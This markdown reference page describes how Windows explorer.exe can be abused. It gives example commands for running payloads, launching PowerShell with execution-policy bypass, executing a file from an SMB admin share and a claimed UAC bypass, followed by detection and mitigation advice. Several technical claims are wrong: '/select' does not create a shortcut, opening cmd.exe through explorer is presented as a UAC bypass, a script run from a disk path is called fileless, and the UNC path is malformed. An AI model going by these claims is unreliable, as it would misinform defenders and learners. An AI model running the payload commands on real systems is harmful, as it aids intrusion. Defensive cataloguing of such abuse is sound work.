# explorer.exe
## What is it?
*```explorer.exe``` is the Windows File Explorer, a graphical user interface (GUI) shell used to browse, open, and manage files and folders in Windows operating systems.*
*It is a core component of the Windows operating system, responsible for managing the desktop, taskbar, file browsing, and overall user interface interaction.*

## Legitimate Usage
- **File Management** → Use to browse and manage files and directories in Windows.
- **Taskbar & Desktop** → Explorer is responsible for the taskbar, Start Menu, and desktop interface.
- **Running Applications** → Through the File Explorer, users can run executables and manage processes.
- **Network Access** → Access shared network drives and files using Explorer’s network browsing capabilities.
- **Drag-and-Drop Operations** → Files and folders can be moved, copied, and managed through the graphical interface.

## How to abuse it
- **Persistence** → Attackers can use ```explorer.exe``` to maintain persistence by executing malicious scripts or programs via the GUI interface.
- **Privilege Escalation** → Attackers can exploit vulnerabilities in ```explorer.exe``` to gain higher system privileges.
- **Bypassing Security Controls** → ```explorer.exe``` can be leveraged to execute malicious files in trusted locations or bypass application whitelisting.
- **Lateral Movement** → Attackers can use ```explorer.exe``` to run malicious applications or scripts on remote systems.
- **Execution of Payloads** → Since ```explorer.exe``` is trusted and commonly executed, attackers can leverage it to run malicious payloads undetected.

## Example attacks
### 1. Launching Malicious Payloads
*Attackers can use ```explorer.exe``` to run malicious executables that they disguise as legitimate files.*

**Execute Malicious Payload through Explorer**

```
explorer.exe C:\path\to\malicious_payload.exe
```

**Effect:**
- The malicious payload runs within the trusted ```explorer.exe``` process, evading detection from security tools that might overlook its execution.
  
### 2. Persistence via Explorer Shortcut
*Attackers can use ```explorer.exe``` to create a shortcut that runs a malicious payload on system startup.*

**Create Shortcut to Malicious Payload**

```
explorer.exe /select, C:\path\to\malicious_payload.exe
```

**Effect:**
- A shortcut is created on the desktop, which runs the payload when clicked, maintaining persistence through user interaction.

### 3. Fileless Execution
*Malicious PowerShell scripts or encoded payloads can be executed by using ```explorer.exe``` to run command files indirectly.*

**Execute PowerShell Script through Explorer**

```
explorer.exe "powershell.exe -NoP -ExecutionPolicy Bypass -Command C:\path\to\malicious_script.ps1"
```

**Effect:**
- Executes a PowerShell script to download and execute further malicious commands, using Explorer to bypass file-based detection methods.

### 4. Lateral Movement via SMB Share
*Attackers can use ```explorer.exe``` to run a malicious file over SMB, enabling lateral movement across the network.*

**Execute Malicious File via SMB Share**

```
explorer.exe \192.168.1.50\C$\Windows\Temp\payload.exe
```

**Effect:**
- Malicious file is executed remotely via SMB, which allows lateral movement from one compromised machine to another.

### 5. Exploiting Explorer for UAC Bypass
*Attackers can use ```explorer.exe``` to bypass User Account Control (UAC) and gain elevated privileges.*

**Bypass UAC Using Explorer**

```
explorer.exe C:\Windows\System32\cmd.exe
```

**Effect:**
- ```cmd.exe``` is launched with elevated privileges by exploiting a UAC bypass vulnerability, giving the attacker administrative control.

### 6. Fileless Attack via Script Execution
*```explorer.exe``` can be used to execute a script stored in memory, reducing the need for file-based malware.*

**Run Malicious VBScript**

```
explorer.exe C:\path\to\script.vbs
```

**Effect:**
- The VBScript runs without being stored in a traditional file, making detection more difficult for traditional antivirus tools.

# Detection & Mitigation
## Detection Methods
**Monitor Suspicious Explorer.exe Executions**
- **Event ID 4688 (New Process Creation)** → Monitor instances where ```explorer.exe``` is executing files from unusual locations, especially non-default directories.
- **Look for Suspicious Command-Line Arguments** → Detect unusual arguments being passed to ```explorer.exe```, such as commands to run executables or scripts.

**Monitor Fileless Executions**
- **Event ID 4104 (PowerShell Command Execution)** → Detect PowerShell commands being executed through ```explorer.exe``` that may indicate a fileless attack.
- **Look for Scripting Languages** → Watch for VBScript, PowerShell, or other script file extensions being executed indirectly via Explorer.

**Monitor SMB Traffic**
- **Event ID 5140 (File Share Access)** → Monitor for unusual SMB access patterns, particularly when ```explorer.exe``` accesses remote shares or executes files from shared locations.

## Mitigation Strategies
- **Application Whitelisting** → Use whitelisting solutions like AppLocker or Windows Defender Application Control (WDAC) to block unauthorized applications from executing via Explorer.
- **Restrict File and Script Execution** → Limit execution rights to specific trusted users and block scripts from running through Explorer.
- **Disable SMBv1** → Disable SMBv1 on all systems to reduce the attack surface for lateral movement via SMB shares.
- **Enforce UAC Policies** → Configure User Account Control (UAC) settings to limit the ability of unauthorized users to bypass elevated privileges.
- **Monitor User Behavior** → Set up alerts for suspicious user activity, particularly actions that involve launching or modifying Explorer-related processes.
